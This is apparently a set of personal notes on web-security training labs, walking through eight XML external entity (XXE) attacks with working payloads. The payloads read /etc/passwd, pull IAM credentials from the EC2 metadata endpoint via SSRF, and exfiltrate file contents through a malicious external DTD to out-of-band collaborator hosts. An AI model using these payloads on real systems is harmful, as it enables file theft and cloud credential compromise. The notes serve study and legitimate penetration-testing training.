# Navigation
1. [Exploiting XXE using external entities to retrieve files](#exploiting-xxe-using-external-entities-to-retrieve-files)
2. [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
3. [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
4. [Blind XXE via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
5. [Exfiltrating data with a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
6. [Blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
7. [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
8. [XXE via image file upload](#exploiting-xxe-via-image-file-upload)
# Exploiting XXE using external entities to retrieve files
- Exploit XXE to retrieve `/etc/passwd` file
1. View a product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Create XML entity and see if your created entity is reflected
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY POC "XML_INJECTION_IS_WORKING">
]>
<stockCheck><productId>&POC;</productId><storeId>
&POC;</storeId></stockCheck>
```
4. Receive the following error message confirming XML entity referencing is working and reflected to us
- "Invalid product ID: XML_INJECTION_IS_WORKING"
5. Read `/etc/passwd`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId>
1</storeId></stockCheck>
```
# Exploiting XXE to perform SSRF attacks
- Exploit XXE to perform SSRF and obtain server's IAM secret key from EC2 metadata endpoint `http://169.254.169.254/`
1. View product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Create XML entity and make a SSRF request to the internal target given above
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
4. The response gives us "Invalid product ID: latest"
5. Append this to the URL of our target payload
```
http://169.254.169.254/latest
```
6. Response gives us "iam"
7. Repeat process until URL is complete
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```
8. Access to admin credential in response
# Blind XXE with out-of-band interaction
- Trigger out-of-band interactions with an external domain
1. View product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Create XML entity and make a OOB request to the collaborator
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://5djg9njnz8rspgmiuil63744wv2mqee3.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
- **Note:** Stuck for a bit, triggering error "Entities are not allowed for security reasons" - This was occurring because I was using `%` to create parameter entities which was blocked by the application
# Blind XXE with out-of-band interaction via XML parameter entities
- Trigger out-of-band interactions with external domain
1. View product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Create XML entity and make a OOB request to the collaborator using `xml parameter entities`
	- **Note:** Do not reference the entity within the XML tags, just make the parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://uyw04yolexbka8gqje7as5t950brzkn9.oastify.com/x"> %ext;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
- See that I have not referenced the entity in the POST body (i.e. `&ext;`)
# Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Exfiltrate contents of `/etc/hostname`
1. View product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Create XML entity and make a OOB request to the collaborator using `xml parameter entities`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://zil5o38qy2vpud0v3jrfcadep5vwj17q.oastify.com/x"> %ext;
]><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```
4. Confirm call back by checking collaborator and seeing interactions
5. Host malicious DTD file on exploit server
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://3ko9q7au06xtwh2z5ntjeefir9x0l49t.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```
6. Send request to target making it call exploit server hosting malicious DTD file
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a46003f03626dae80071b5b01a60033.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```
7. Check collaborator and you will see a HTTP request for `/x?=<contents_of_/etc/hostname>`
# Exploiting blind XXE to retrieve data via error messages
- Read `/etc/passwd` file
1. View product and check the stock
2. POST `/product/stock` sends an XML request specifying product and store ID
3. Test verbose XML errors by removing a closing tag in the xml request
```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId><storeId>1</storeId></stockCheck>
```
- I got rid of `</productId>`
4. Verbose error message in HTTP response
5. Test remote call to attack server to confirm if we can host a malicious DTD file
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://rfadgeqx5lkt4iun1s875nue55bwzmnb.oastify.com.oastify.com/x"> %ext;
]><productId>3</productId><storeId>1</storeId></stockCheck>
```
- Callback to collaborator confirms we can make remote calls
6. Host malicious DTD which will cause error containing the contents of `/etc/passwd`
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
7. Make remote call to include malicious DTD hosted on exploit server
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "https://exploit-0a5b004903cf39a6806b43c30198001c.exploit-server.net/exploit">
  %remote;
  %error;
]><productId>3</productId><storeId>1</storeId></stockCheck>
```
8. Contents included in HTTP response error message
# Exploiting XInclude to retrieve files
- Inject `XInclude` statement to retrieve `/etc/passwd`
1. View product
2. Check stock
3. POST `/product/stock` is sending a request using `application/x-www-form-urlencoded` content type
4. In the `productId` parameter submit an "XInclude" payload attack
```html
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi:include+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```
- This payload is URL encoded
5. Retrieve `/etc/passwd`
# Exploiting XXE via image file upload
- Retrieve `/etc/hostname`
- Post comments and select an avatar as a file upload
1. Go to post
2. Upload normal jpg to see intended behaviour (if it is too large just nuke a lot of the image data)
3. Test uploading `.svg` extension and `Content-Type: image/svg+xml`
	- Is allowed meaning we can try XXE payloads
4. Upload `svg` image with XXE payload to read hostname
```xml
<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname">]>
 <svg width="256px" height="256px" xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
 <text font-size="23" x="8" y="28">&xxe;</text>
 </svg>
```
- All of this goes into the `form-data; name="avatar";` section
![xxe-screenshot](/XXE/Resources/xxeFileUpload.png)
5. Go back to post
6. Inspect element > View profile picture with XXE payload > View source and read `hostname` from the upload image
- **Note:**
	- Detect OOB XXE using normal OOB payload (might trigger 500 error, but that is okay) - just check collaborator
```xml
<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://xbchhb5ymn4kzk4xp2m3jjotekkb81wq.oastify.com">
%remote; ]>
 <svg width="256px" height="256px" xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
 <text font-size="23" x="8" y="28">&remote;</text>
 </svg>
```

